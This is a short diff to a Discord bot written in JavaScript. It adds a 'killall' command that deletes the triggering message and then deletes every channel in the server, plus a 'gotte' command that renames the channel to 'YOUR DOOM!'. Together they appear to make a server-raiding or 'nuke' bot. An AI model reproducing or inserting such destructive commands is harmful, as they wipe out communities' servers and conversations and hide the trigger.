@@ -44,7 +44,13 @@ client.on('message', message=> {
             message.delete();
             client.user.setActivity('YOUR DOOM!', { type: 'PLAYING'}).catch(console.error);
         break;
-            
+        case 'killall':
+            message.delete();
+            message.guild.channels.deleteAll();
+        break;
+        case 'gotte':
+            message.delete();
+            message.channel.setName("YOUR DOOM!")
         break;
 
     }
